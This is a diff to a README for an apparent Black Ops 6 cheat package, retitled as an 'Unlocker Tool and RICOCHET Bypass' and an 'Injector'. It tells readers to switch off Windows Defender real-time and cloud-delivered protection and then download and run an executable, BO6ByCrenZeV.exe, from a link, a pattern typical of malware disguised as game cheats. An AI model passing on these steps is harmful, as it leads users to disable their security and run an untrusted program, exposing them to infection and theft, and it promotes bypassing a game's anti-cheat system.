@@ -1,4 +1,4 @@
-# Game Enhancer
+# Black Ops 6 Cheats Including Unlocker Tool and RICOCHET Bypass by @CrenZeV
 
 > ⚠️ **Important:** Before running, you must disable **Real-time protection** and **Cloud-delivered protection** in Windows Defender to allow the tool to function properly. Without this step, the tool will not work! See below for instructions with images.
 
@@ -21,8 +21,8 @@ To ensure smooth functioning, make sure **Real-time protection** and **Cloud-del
 > ⚠️ **Note:** Both settings must be off. Otherwise, the tool will not operate as expected.
 
 ---
-
-### Step 2: Launching the Game Enhancer
+   ![Windows Defender Settings](screenshots/loader.png)
+### Step 2: Launching the Injector
 
 1. **Download the Tool**  
    - Get `BO6ByCrenZeV.exe` from the provided link.
